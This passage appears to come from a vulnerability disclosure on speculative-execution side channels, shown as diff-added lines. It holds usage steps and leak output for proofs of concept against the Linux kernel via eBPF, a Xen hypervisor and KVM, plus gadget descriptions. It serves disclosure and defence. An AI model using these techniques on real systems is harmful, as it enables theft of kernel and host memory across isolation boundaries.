+000017f0  61 6e 20 69 6e 74 65 72 64 61 43 65 20 74 6f 20  |an interdaCe to |
+00001800  74 68 65 20 66 72 65 69 30 72 20 41 50 49 20 66  |the frei0r API f|
+00001810  6f 72 0a 20 4f 43 61 6d 6c 20 70 72 6f 67 72 61  |or. OCaml progra|
+
+"OCaml interface to the frei0r API -- developpement files" appears in
+Ubuntu's repository. Maybe this is from when I installed software
+earlier. It looks like there are around three bit errors in this chunk
+of memory - this could probably be fixed by reading twice or so, but
+seems tolerable to me.
+
+
+00003780  d0 e7 09 9c ff ff ff ff 33 66 65 38 38 62 33 66  |........3fe88b3f|
+00003790  33 62 61 38 34 34 61 38 34 36 66 35 62 34 30 63  |3ba844a846f5b40c|
+000037a0  13 36 62 63 34 65 63 31 66 61 62 36 66 65 65 62  |.6bc4ec1fab6feeb|
+000037b0  63 30 37 33 31 38 64 61 31 64 31 63 63 0a 53 65  |c07318da1d1cc.Se|
+000037c0  63 74 69 6f 6e 3a 20 6c 69 62 73 0a 53 69 7a 65  |ction: libs.Size|
+000037d0  3a 20 31 32 39 39 33 34 0a 0a 50 61 63 6b 61 67  |: 129934..Packag|
+000037e0  65 3a 20 6c 69 62 66 72 6f 6e 74 69 65 72 2d 72  |e: libfrontier-r|
+000037f0  70 63 2d 70 65 72 6c 0a 56 65 72 73 69 6f 6e 3a  |pc-perl.Version:|
+00003800  20 30 2e 30 37 62 34 2d 36 0a 49 6e 73 74 61 6c  | 0.07b4-6.Instal|
+00003810  6c 65 64 2d 53 69 7a 65 3a 20 31 34 38 0a 4d 61  |led-Size: 148.Ma|
+
+
+=== EXPLOIT USAGE (AMD) ===
+I have tested the exploit on an AMD PRO A8-9600 R7 machine with
+Debian Jessie, with kernel 4.9.0-0.bpo.3-amd64 from
+the Debian backports repo.
+
+For this CPU, it seems like a bit of luck is needed to get the attack
+to succeed. Additionally, you'll have to enable the kernel's JIT
+engine - perhaps the CPU doesn't support enough inflight operations
+for the bug to be hittable from the bytecode interpreter or so? You
+can turn the JIT engine on as follows:
+
+root@jannh-amdbox:/proc/sys/net/core# cat bpf_jit_enable 
+0
+root@jannh-amdbox:/proc/sys/net/core# cat bpf_jit_harden 
+0
+root@jannh-amdbox:/proc/sys/net/core# echo 1 > bpf_jit_enable 
+root@jannh-amdbox:/proc/sys/net/core# cat bpf_jit_harden 
+0
+root@jannh-amdbox:/proc/sys/net/core# cat bpf_jit_enable 
+1
+
+The exploit is in
+writeup_files/kernel_leak_exploit_amd_pro_a8_9600_r7.
+Compile the exploit with
+"gcc -pthread -o bpf_stuff bpf_stuff.c -Wall -ggdb -std=gnu99".
+It seems like the kernel headers of Debian Jessie are too old, so
+you'll have to include those from somewhere else - e.g. by
+compiling the kernel yourself (with "make headers_install") (any
+kernel >=4.4 should do), then adding a parameter like this to
+the gcc invocation:
+"-I/path/to/linux-4.4/usr/include".
+
+Run the exploit with "./bpf_stuff". If the attack works, something
+like the following should show up eventually - if it still doesn't
+start dumping kernel memory after a few minutes or so, maybe try
+starting the exploit again or so.
+
+
+fixing up exit jump
+==========================
+0: (bf) r6 = r1
+1: (18) r1 = 0xbded000
+3: (bf) r2 = r10
+4: (07) r2 += -4
+5: (62) *(u32 *)(r2 +0) = 1
+6: (85) call 1
+7: (15) if r0 == 0x0 goto pc+6
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R10=fp
+8: (79) r3 = *(u64 *)(r0 +0)
+9: (18) r2 = 0xdad43000
+11: (bf) r1 = r6
+12: (85) call 12
+13: (b7) r0 = 0
+14: (95) exit
+
+from 7 to 14: R0=inv,min_value=0,max_value=0 R6=ctx R10=fp
+14: (95) exit
+processed 14 insns
+==========================
+huh, nothing found. retrying...
+reload_time 118 at 0xffff8b8780003000
+high-order and low-order bits look good
+leaking middle offset...
+testing for bit 30 (0x40000000): votes: 0 vs 6; errors: 2, 0; decided_bit=1; addr_mixin=0x40000000; leaked_addr=0xffff8b87c0003000
+testing for bit 29 (0x20000000): votes: 5 vs 0; errors: 3, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87c0003000
+testing for bit 28 (0x10000000): votes: 0 vs 3; errors: 5, 0; decided_bit=1; addr_mixin=0x10000000; leaked_addr=0xffff8b87d0003000
+testing for bit 27 (0x8000000): votes: 0 vs 5; errors: 3, 0; decided_bit=1; addr_mixin=0x8000000; leaked_addr=0xffff8b87d8003000
+testing for bit 26 (0x4000000): votes: 5 vs 0; errors: 3, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87d8003000
+testing for bit 25 (0x2000000): votes: 0 vs 4; errors: 4, 0; decided_bit=1; addr_mixin=0x2000000; leaked_addr=0xffff8b87da003000
+testing for bit 24 (0x1000000): votes: 2 vs 0; errors: 6, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87da003000
+votecount suspiciously low
+leaking middle offset...
+testing for bit 30 (0x40000000): votes: 0 vs 3; errors: 5, 0; decided_bit=1; addr_mixin=0x40000000; leaked_addr=0xffff8b87c0003000
+testing for bit 29 (0x20000000): votes: 5 vs 0; errors: 3, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87c0003000
+testing for bit 28 (0x10000000): votes: 0 vs 4; errors: 4, 0; decided_bit=1; addr_mixin=0x10000000; leaked_addr=0xffff8b87d0003000
+testing for bit 27 (0x8000000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x8000000; leaked_addr=0xffff8b87d8003000
+testing for bit 26 (0x4000000): votes: 2 vs 0; errors: 6, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87d8003000
+votecount suspiciously low
+leaking middle offset...
+testing for bit 30 (0x40000000): votes: 0 vs 3; errors: 5, 0; decided_bit=1; addr_mixin=0x40000000; leaked_addr=0xffff8b87c0003000
+testing for bit 29 (0x20000000): votes: 5 vs 0; errors: 3, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87c0003000
+testing for bit 28 (0x10000000): votes: 0 vs 4; errors: 4, 0; decided_bit=1; addr_mixin=0x10000000; leaked_addr=0xffff8b87d0003000
+testing for bit 27 (0x8000000): votes: 0 vs 6; errors: 2, 0; decided_bit=1; addr_mixin=0x8000000; leaked_addr=0xffff8b87d8003000
+testing for bit 26 (0x4000000): votes: 6 vs 0; errors: 2, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87d8003000
+testing for bit 25 (0x2000000): votes: 0 vs 3; errors: 5, 0; decided_bit=1; addr_mixin=0x2000000; leaked_addr=0xffff8b87da003000
+testing for bit 24 (0x1000000): votes: 4 vs 0; errors: 4, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87da003000
+testing for bit 23 (0x800000): votes: 0 vs 8; errors: 0, 0; decided_bit=1; addr_mixin=0x800000; leaked_addr=0xffff8b87da803000
+testing for bit 22 (0x400000): votes: 0 vs 6; errors: 2, 0; decided_bit=1; addr_mixin=0x400000; leaked_addr=0xffff8b87dac03000
+testing for bit 21 (0x200000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87dac03000
+testing for bit 20 (0x100000): votes: 0 vs 7; errors: 1, 0; decided_bit=1; addr_mixin=0x100000; leaked_addr=0xffff8b87dad03000
+testing for bit 19 (0x80000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87dad03000
+testing for bit 18 (0x40000): votes: 0 vs 8; errors: 0, 0; decided_bit=1; addr_mixin=0x40000; leaked_addr=0xffff8b87dad43000
+testing for bit 17 (0x20000): votes: 7 vs 0; errors: 1, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87dad43000
+testing for bit 16 (0x10000): votes: 3 vs 0; errors: 5, 0; decided_bit=0; addr_mixin=0x0; leaked_addr=0xffff8b87dad43000
+LEAKED BPF ARRAY POINTER: 0xffff8b87dad43000
+==========================
+0: (b7) r0 = 0
+1: (95) exit
+processed 2 insns
+==========================
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+fixing up exit jump
+==========================
+0: (bf) r6 = r1
+1: (18) r1 = 0xdd1920c0
+3: (bf) r2 = r10
+4: (07) r2 += -4
+5: (62) *(u32 *)(r2 +0) = 2
+6: (85) call 1
+7: (15) if r0 == 0x0 goto pc+42
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R10=fp
+8: (79) r7 = *(u64 *)(r0 +0)
+9: (18) r1 = 0xdd1920c0
+11: (bf) r2 = r10
+12: (07) r2 += -4
+13: (62) *(u32 *)(r2 +0) = 3
+14: (85) call 1
+15: (15) if r0 == 0x0 goto pc+34
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R7=inv R10=fp
+16: (79) r9 = *(u64 *)(r0 +0)
+17: (18) r1 = 0xdd1920c0
+19: (bf) r2 = r10
+20: (07) r2 += -4
+21: (62) *(u32 *)(r2 +0) = 1
+22: (85) call 1
+23: (15) if r0 == 0x0 goto pc+26
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R7=inv R9=inv R10=fp
+24: (79) r8 = *(u64 *)(r0 +0)
+25: (18) r1 = 0xdd1920c0
+27: (bf) r2 = r10
+28: (07) r2 += -4
+29: (62) *(u32 *)(r2 +0) = 0
+30: (85) call 1
+31: (15) if r0 == 0x0 goto pc+18
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R7=inv R8=inv R9=inv R10=fp
+32: (79) r0 = *(u64 *)(r0 +0)
+33: (bf) r2 = r10
+34: (07) r2 += -4
+35: (63) *(u32 *)(r2 +0) = r0
+36: (18) r1 = 0xdd192840
+38: (85) call 1
+39: (15) if r0 == 0x0 goto pc+10
+ R0=map_value(ks=4,vs=8,id=0),min_value=0,max_value=0 R6=ctx R7=inv R8=inv R9=inv R10=fp
+40: (79) r3 = *(u64 *)(r0 +0)
+41: (5f) r3 &= r7
+42: (7f) r3 >>= r9
+43: (67) r3 <<= 7
+44: (0f) r3 += r8
+45: (18) r2 = 0xdad43000
+47: (bf) r1 = r6
+48: (85) call 12
+49: (b7) r0 = 0
+50: (95) exit
+
+from 39 to 50: R0=inv,min_value=0,max_value=0 R6=ctx R7=inv R8=inv R9=inv R10=fp
+50: (95) exit
+
+from 31 to 50: safe
+
+from 23 to 50: R0=inv,min_value=0,max_value=0 R6=ctx R7=inv R9=inv R10=fp
+50: (95) exit
+
+from 15 to 50: R0=inv,min_value=0,max_value=0 R6=ctx R7=inv R10=fp
+50: (95) exit
+
+from 7 to 50: R0=inv,min_value=0,max_value=0 R6=ctx R10=fp
+50: (95) exit
+processed 50 insns
+==========================
+00001000  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00001010  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00001020  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00001030  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00001040  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+00001050  00 00 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |................|
+[...]
+00003900  80 25 b1 c0 ff ff ff ff 40 9e b3 0a 88 8b ff ff  |.%......@.......|
+[...]
+00003950  f0 61 19 dd 87 8b ff ff 00 00 00 00 07 63 68 61  |.a...........cha|
+00003960  6e 6e 65 6c 00 00 00 00 00 00 00 00 00 00 00 00  |nnel............|
+[...]
+00003a10  b0 62 19 dd 87 8b ff ff 00 00 00 00 0b 69 70 5f  |.b...........ip_|
+00003a20  6d 72 5f 63 61 63 68 65 00 00 00 00 00 00 00 00  |mr_cache........|
+[...]
+00003c50  f0 64 19 dd 87 8b ff ff 00 00 00 00 05 66 6c 75  |.d...........flu|
+00003c60  73 68 00 00 00 00 00 00 00 00 00 00 00 00 00 00  |sh..............|
+[...]
+00004190  30 6a 19 dd 87 8b ff ff 00 00 00 00 10 61 75 74  |0j...........aut|
+000041a0  68 2e 72 70 63 73 65 63 2e 69 6e 69 74 00 00 00  |h.rpcsec.init...|
+[...]
+00004250  f0 6a 19 dd 87 8b ff ff 00 00 00 00 0d 61 75 74  |.j...........aut|
+00004260  68 2e 75 6e 69 78 2e 67 69 64 00 00 00 00 00 00  |h.unix.gid......|
+[...]
+00008d10  00 00 00 00 00 00 00 00 01 01 69 62 36 34 2f 6c  |..........ib64/l|
+00008d20  64 2d 6c 69 6e 75 78 2d 78 38 36 2d 36 34 2e 73  |d-linux-x86-64.s|
+00008d30  6f 2e 32 00 59 d0 ff ff 40 ea 29 88 59 d0 ff ff  |o.2.Y...@.).Y...|
+[...]
+000246e0  04 00 00 00 00 00 00 00 73 5f 66 6e 5f 69 6d ??  |........s_fn_im?|
+000246f0  73 2e 68 70 70 3e 0a 23 69 6e 63 6c 75 64 65 20  |s.hpp>.#include |
+00024700  3c 65 78 74 2f 21 4a 2d 37 1d 2e 52 4c 48 08 3a  |<ext/!J-7..RLH.:|
+[...]
+000276f0  00 00 00 00 00 00 00 00 74 20 61 0a 20 6d 75 6c  |........t a. mul|
+00027700  74 69 2d 66 75 6e 63 74 69 6f 6e 61 6c 20 70 61  |ti-functional pa|
+00027710  6e 65 6c 20 74 68 61 74 20 63 61 6e 20 65 76 65  |nel that can eve|
+00027720  6e 20 68 61 6e 64 6c 65 20 70 6c 75 67 69 6e 73  |n handle plugins|
+00027730  20 61 6e 64 20 74 68 65 20 6c 69 6b 65 2c 20 78  | and the like, x|
+00027740  66 63 65 34 2d 70 61 6e 65 6c 0a 20 6d 69 67 68  |fce4-panel. migh|
+00027750  74 20 62 65 20 77 6f 72 00 00 00 00 00 00 00 00  |t be wor........|
+[...]
+00036000  15 03 44 48 34 29 2c 0d 0a 20 20 20 20 42 50 46  |..DH4),..    BPF|
+00036010  5f 53 54 5f 4d 45 4d 28 42 50 46 5f 57 2c 20 42  |_ST_MEM(BPF_W, B|
+00036020  50 46 5f 52 45 47 5f 41 52 47 32 2c 20 30 2c 20  |PF_REG_ARG2, 0, |
+00036030  31 29 2c 0d 0a 20 20 20 20 42 50 46 5f 45 4d 49  |1),..    BPF_EMI|
+00036040  54 5f 43 41 4c 4c 28 42 50 46 5f 46 55 4e 43 5f  |T_CALL(BPF_FUNC_|
+00036050  6d 61 70 5f 6c 6f 6f 6b 75 70 5f 65 6c 65 6d 29  |map_lookup_elem)|
+00036060  2c 1b 5b 35 35 3b 39 31 48 35 33 37 2c 36 32 1b  |,.[55;91H537,62.|
+00036070  5b 38 43 35 36 25 1b 5b 32 37 3b 36 32 48 1b 5b  |[8C56%.[27;62H.[|
+00036080  3f 31 32 6c 1b 5b 3f 32 35 68 1b 5b 3f 32 35 6c  |?12l.[?25h.[?25l|
+00036090  1b 5b 35 35 3b 31 48 2f 32 30 1b 5b 35 35 3b 39  |.[55;1H/20.[55;9|
+000360a0  31 48 1b 5b 4b 1b 5b 35 35 3b 31 48 00 00 00 00  |1H.[K.[55;1H....|
+[...]
+00079750  00 00 00 00 00 00 00 00 63 6f 6e 74 72 6f 6c 20  |........control |
+00079760  72 75 6e 74 69 6d 65 20 62 65 68 61 76 69 6f 72  |runtime behavior|
+00079770  20 77 69 74 68 20 74 68 69 73 2e 0d 0a 20 20 2f  | with this...  /|
+00079780  2f 20 73 6c 6f 74 20 30 3a 20 69 6e 64 65 78 20  |/ slot 0: index |
+00079790  6f 66 20 73 65 63 72 65 74 20 76 61 6c 75 65 0d  |of secret value.|
+000797a0  0a 20 20 2f 2f 20 73 6c 6f 74 20 31 3a 20 73 74  |.  // slot 1: st|
+000797b0  61 72 74 20 6f 66 00 00 00 00 00 00 00 00 00 00  |art of..........|
+[...]
+0007a760  08 d0 20 dd 87 8b ff ff 6c 69 6e 75 78 2d 68 65  |.. .....linux-he|
+0007a770  61 64 65 72 73 2d 34 2e 39 2e 30 2d 30 2e 62 70  |aders-4.9.0-0.bp|
+0007a780  6f 2e 33 2d 63 6f 6d 6d 6f 6e 00 00 00 00 00 00  |o.3-common......|
+[...]
+0007a860  01 00 00 00 00 00 00 00 6d 65 6e 75 5f 73 72 5f  |........menu_sr_|
+0007a870  72 73 2e 69 73 6f 5f 38 38 35 39 2d 32 2e 76 69  |rs.iso_8859-2.vi|
+0007a880  6d 2e 64 70 6b 67 2d 74 6d 70 00 00 00 00 00 00  |m.dpkg-tmp......|
+[...]
+0007a920  c9 d5 20 dd 87 8b ff ff 6d 65 6e 75 5f 73 6c 6f  |.. .....menu_slo|
+0007a930  76 61 6b 5f 73 6c 6f 76 61 6b 5f 72 65 70 75 62  |vak_slovak_repub|
+0007a940  6c 69 63 2e 31 32 35 30 2e 76 69 6d 2e 64 70 6b  |lic.1250.vim.dpk|
+0007a950  67 2d 74 6d 70 00 00 00 00 00 00 00 00 00 00 00  |g-tmp...........|
+
+
+
+== DEMONSTRATION OF THEORETICAL KERNEL DATA LEAK ON AARCH64 ==
+I tried leaking data from a Cortex A15 CPU using eBPF, but didn't
+succeed. Therefore, I decided to patch some easily-attackable code
+into the kernel to at least show that, given a vulnerable code pattern
+in the kernel, ARM CPUs are at least theoretically vulnerable, too.
+
+This demo is similar to the userland-only demo shown previously.
+
+This test was performed on one of the two ARM Cortex A57 cores of a
+Nexus 5x / bullhead. This device has six cores, but only the two A57
+cores are capable of out-of-order execution.
+
+Patch the kernel (Android kernel based on 3.10) using the patch in
+writeup_files/arm_bullhead_demo/kernel_patch.diff, compile
+writeup_files/arm_bullhead_demo/demo.c and store it on the device,
+then run the demo program. The result should look roughly like this:
+
+bullhead:/ # /data/local/tmp/demo_64
+hot: 22 cold: 21
+hot: 22 cold: 20
+hot: 13 cold: 26
+hot: 13 cold: 20
+hot: 13 cold: 20
+hot: 13 cold: 21
+hot: 13 cold: 21
+hot: 22 cold: 22
+hot: 14 cold: 21
+hot: 14 cold: 21
+index 0, bit 1, votes[0]=0, votes[1]=248
+index 1, bit 0, votes[0]=246, votes[1]=0
+index 2, bit 0, votes[0]=245, votes[1]=0
+index 3, bit 1, votes[0]=19, votes[1]=253
+index 4, bit 0, votes[0]=254, votes[1]=0
+index 5, bit 1, votes[0]=20, votes[1]=254
+index 6, bit 1, votes[0]=123, votes[1]=255
+index 7, bit 0, votes[0]=254, votes[1]=218
+index 8, bit 1, votes[0]=225, votes[1]=256
+index 9, bit 1, votes[0]=209, votes[1]=255
+index 10, bit 1, votes[0]=198, votes[1]=254
+index 11, bit 1, votes[0]=197, votes[1]=256
+index 12, bit 0, votes[0]=255, votes[1]=234
+index 13, bit 0, votes[0]=250, votes[1]=215
+index 14, bit 0, votes[0]=241, votes[1]=213
+index 15, bit 1, votes[0]=230, votes[1]=256
+
+(Sometimes the PoC prints incorrect runs of "bit 1"; in that case, try
+running it again. Perhaps the treshold I chose isn't optimal.)
+
+
+== SECOND ATTACK PATTERN: DIRECT SPECULATIVE RIP CONTROL ==
+This section describes another way in which speculative execution can
+be used to perform attacks across privilege boundaries. Intel CPUs
+seem to be vulnerable; ARM shouldn't be vulnerable according to some
+documentation I found; and I haven't tested an AMD CPU yet.
+
+The branch target buffer of Intel CPUs does not take the privilege
+level or the VMX status into account; it is publically known that this
+means that an attacker inside a VM can determine the virtual address
+at which a hypervisor is loaded by abusing branch target buffer
+collisions. See https://github.com/felixwilhelm/mario_baslr, a PoC
+that determines the address at which the host kernel is loaded from
+within a KVM guest.
+
+But this can also be abused the other way around: An attacker in guest
+context can poison the branch target buffer so that, when a colliding
+indirect jump/call with a high-latency operand is executed, the CPU
+speculatively executes instructions starting at an attacker-controlled
+virtual address.
+
+I believe that this attack is much more likely to work against
+hypervisors than the first one; the first attack requires either a JIT
+engine or the presence of a specific code construct while this attack
+should, from what I can tell, mostly only require:
+
+ - A gadget, or possibly a ROP chain, that is stored in
+   hypervisor-executable memory and loads a guest-accessible cacheline
+   depending on some secret data the attacker wants to read.
+   NOTE: I haven't yet verified whether ROP indeed works in
+   speculative execution. I expect that it will cause some delay
+   because of the prediction miss caused by the in-CPU control stack.
+ - A cacheline-flushing primitive; this should be doable using
+   eviction patterns, similar to what is done in rowhammer.js, even
+   if the guest doesn't have access to hugepages.
+ - An indirect call to a destination loaded from memory whose
+   execution the attacker can trigger. Depending on the gadget or ROP
+   chain, the attacker might need control over one or multiple
+   registers at the indirect call.
+
+It was already known that the branch target buffer selects the set
+based on the lower 31 bits and ignores the upper half of 64-bit
+addresses (see http://www.cs.binghamton.edu/~dima/micro16.pdf); I have
+determined that something similar applies to the stored target
+addresses. It seems like the branch target buffer stores either an
+offset from the branch instruction or the lower half of the target
+address. This means that, to steer speculative hypervisor control flow
+from a guest VM, it is at least in theory sufficient to run code in
+unprivileged guest userspace.
+
+From what I can tell from ARM's documentation, this attack variant
+probably doesn't affect ARMv8, in particular not across exception
+levels; for example,
+<https://developer.arm.com/docs/ddi0488/latest/level-1-memory-system/program-flow-prediction/btb-invalidation-and-context-switches>
+states:
+
+> The BTB is tagged by all memory space information required to
+> uniquely identify a virtual memory space, ASID, VMID, security, and
+> Exception level. All predictions are checked at branch resolution
+> time to ensure that a legal branch is resolved. Therefore, flushing
+> the BTB on a context switch is not required. AArch64 state does not
+> implement BTB flush instructions.
+
+I don't know whether that also applies to ARMv7 though?
+
+=== DEMONSTRATION WITH MODIFIED HYPERVISOR ===
+To demonstrate this type of attack, I have added some code to Xen that
+simplifies the attack, then performed the attack from within an HVM
+guest. This attack was again tested on the Intel Xeon CPU E5-1650 v3.
+
+Patch Xen 4.8.1 with the patch in
+writeup_files/xen_4.8.1_patched_demo/xen-make-exploitable.patch.
+This patch adds:
+ - an array `secret_data` that contains some secret data; the goal is
+   to leak it. the secret data is again the bitstring 1001011011110001.
+ - ten unused functions containing identical code with the basic
+   vulnerable pattern from the introduction (without any bounds check):
+     unsigned long load_loadme_unused{n}(unsigned long index) { return loadme[(secret_data[index]&1)<<10]; }
+   Note that there is no legitimate way to call these!
+ - An unprivileged hypercall 0x13370000 for testing whether a
+   cacheline in the `loadme` array is hot, then flushing both relevant
+   cachelines in the `loadme` array to main memory.
+ - An unprivileged hypercall 0x13370001 that performs an indirect call
+   to a no-op function using a function pointer stored in a cacheline
+   that has been flushed to main memory.
+
+Now, in the Xen build tree on the host, extract the addresses of the
+ten functions load_loadme_unused_* and the address of the indirect
+jump in call_nop_indirectly():
+
+$ objdump -d -Mintel ./xen/xen-syms | grep load_loadme_unused
+ffff82d0801cc370 <load_loadme_unused0>:
+ffff82d0801cc390 <load_loadme_unused1>:
+ffff82d0801cc3b0 <load_loadme_unused2>:
+ffff82d0801cc3d0 <load_loadme_unused3>:
+ffff82d0801cc3f0 <load_loadme_unused4>:
+ffff82d0801cc410 <load_loadme_unused5>:
+ffff82d0801cc430 <load_loadme_unused6>:
+ffff82d0801cc450 <load_loadme_unused7>:
+ffff82d0801cc470 <load_loadme_unused8>:
+ffff82d0801cc490 <load_loadme_unused9>:
+$ objdump -d -Mintel ./xen/xen-syms | grep -A20 '<call_nop_indirectly>' | grep 'call.*nop_pointer_area'
+ffff82d0801cc52e: ff 15 fc 54 14 00     call   QWORD PTR [rip+0x1454fc]        # ffff82d080311a30 <nop_pointer_area+0x1030>
+
+Copy these addresses into the source of
+writeup_files/xen_4.8.1_patched_demo/lowmap_test.c
+(load_loadme_unused_addrs, CALL_NOP_INDIRECTLY_CALL_ADDR and the two
+hardcoded pointers in main()). Then, copy it to the guest, compile it
+and run it. The result should look like this:
+
+user@linux-hvm:~/foo$ uname -a
+Linux linux-hvm 3.16.0-4-amd64 #1 SMP Debian 3.16.43-2 (2017-04-30) x86_64 GNU/Linux
+user@linux-hvm:~/foo$ gcc -Wall -o lowmap_test lowmap_test.c -std=gnu99
+user@linux-hvm:~/foo$ ./lowmap_test 
+fresh flushed: 980
+fresh flushed: 991
+[...]
+fresh flushed: 1096
+fresh flushed: 1201
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 0: 1 (100% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 1: 0 (0% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 2: 0 (0% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 3: 1 (100% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 4: 0 (0% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 5: 1 (100% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 6: 1 (100% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 7: 0 (0% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 8: 1 (100% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 9: 1 (100% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 10: 1 (100% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 11: 1 (100% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 12: 0 (0% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 13: 0 (0% one)
+0000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000000
+bit 14: 0 (0% one)
+1111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111111
+bit 15: 1 (100% one)
+
+=== PRELIMINARY RESULTS FOR ATTACKING KVM ===
+This section describes some preliminary results that suggest that
+leaking host memory from inside a KVM guest may be possible. This is
+not intended to be a reproducible bug report - I haven't managed to
+make the attack work against a distro kernel yet -, but rather to
+inform you about my current progress and provide an indication of the
+exploitability of this issue in the context of hardware virtualization.
+If you do want to try running the PoC, you'll have to search for
+gadgets yourself and fix up all the hardcoded offsets in the exploit.
+
+I have compiled Linux 4.11 with the following modifications using GCC
+4.8.4, using a kernel config based on a Ubuntu 14.04 distro kernel
+config:
+
+ - in the kernel config, changed CONFIG_KVM and CONFIG_KVM_INTEL to
+   "y" instead of "m" - that was probably unnecessary
+ - added code to the code path that handles VM exits; the added code
+   flushes the cacheline containing &kvm_x86_ops->handle_external_intr
+   and performs a pipeline flush using `cpuid`
+   (patch in kvm_4.11_preliminary_stuff/vmx_exit_path_extraflush.patch)
+
+Additionally, the PoC requires the attacker to provide several
+host kernel addresses (some code addresses and the address where the
+host kernel maps a specific guest-owned page).
+
+The PoC targets the invocation of kvm_x86_ops->handle_external_intr in
+the VM exit path and attempts to speculatively divert execution at
+that point.
+
+The PoC abuses that a VM exit leaves most guest register state intact
+and that the AMD64 calling convention permits functions to not restore
+r8-r11 on return. Specifically, the PoC relies on r8 and r9 still
+being guest-controlled at the point where execution is diverted.
+
+The PoC abuses two types of gadgets in the kernel image that are
+executed speculatively:
+
+ - The function __bpf_prog_run in kernel >=3.18, when called with rsi
+   pointing to a controlled buffer, will execute attacker-controlled
+   bytecode without any further validation. This bytecode provides
+   primitives for reading from addresses stored in bytecode
+   "registers", for loading 64-bit immediates into bytecode
+   "registers" and for arbitrary arithmetic - everything that's needed
+   for the attack.
+ - Multiple gadgets similar to "mov rsi, [r8+8]; call [rsi]". To
+   speed up the indirect call in the gadget, the branch target buffer
+   is poisoned with the same control flow that would happen during
+   non-speculative execution.
+
+The PoC is at writeup_files/kvm_4.11_preliminary_stuff/poc.c.
+
+Here is the output of a test run of the PoC, leaking the host kernel's
+core_pattern. The thing at the start of every line is a
+HH:MM:SS timestamp. (I have removed some of the more verbose output.)
+
+[14:22:57] 0xffffffffa8e9ef60: 0x7c
+[14:22:57] 0xffffffffa8e9ef61: 0x2f
+[14:22:58] 0xffffffffa8e9ef62: 0x75
+[14:22:58] 0xffffffffa8e9ef63: 0x73
+[14:22:58] 0xffffffffa8e9ef64: 0x72
+[14:22:59] 0xffffffffa8e9ef65: 0x2f
+[14:22:59] 0xffffffffa8e9ef66: 0x73
+[14:22:59] 0xffffffffa8e9ef67: 0x68
+[14:22:59] 0xffffffffa8e9ef68: 0x61
+[14:22:59] 0xffffffffa8e9ef69: 0x72
+[14:22:59] 0xffffffffa8e9ef6a: 0x65
+[14:23:00] 0xffffffffa8e9ef6b: 0x2f
+[14:23:00] 0xffffffffa8e9ef6c: 0x61
+[14:23:00] 0xffffffffa8e9ef6d: 0x70
+[14:23:00] 0xffffffffa8e9ef6e: 0x70
+[14:23:00] 0xffffffffa8e9ef6f: 0x6f
+[14:23:00] 0xffffffffa8e9ef70: 0x72
+[14:23:00] 0xffffffffa8e9ef71: 0x74
+[14:23:00] 0xffffffffa8e9ef72: 0x2f
+[14:23:00] 0xffffffffa8e9ef73: 0x61
+[14:23:02] 0xffffffffa8e9ef74: 0x70
+[14:23:02] 0xffffffffa8e9ef75: 0x70
+[14:23:06] 0xffffffffa8e9ef76: 0x6f
+[14:23:06] 0xffffffffa8e9ef77: 0x72
+[14:23:06] 0xffffffffa8e9ef78: 0x74
+[14:23:06] 0xffffffffa8e9ef79: 0x20
+[14:23:17] 0xffffffffa8e9ef7a: 0x25
+[14:23:19] 0xffffffffa8e9ef7b: 0x70
+[14:23:19] 0xffffffffa8e9ef7c: 0x20
+[14:23:19] 0xffffffffa8e9ef7d: 0x25
+[14:23:29] 0xffffffffa8e9ef7e: 0x73
+[14:23:37] 0xffffffffa8e9ef7f: 0x20
+[14:23:37] 0xffffffffa8e9ef80: 0x25
+[14:23:37] 0xffffffffa8e9ef81: 0x63
+[14:23:37] 0xffffffffa8e9ef82: 0x20
+[14:23:39] 0xffffffffa8e9ef83: 0x25
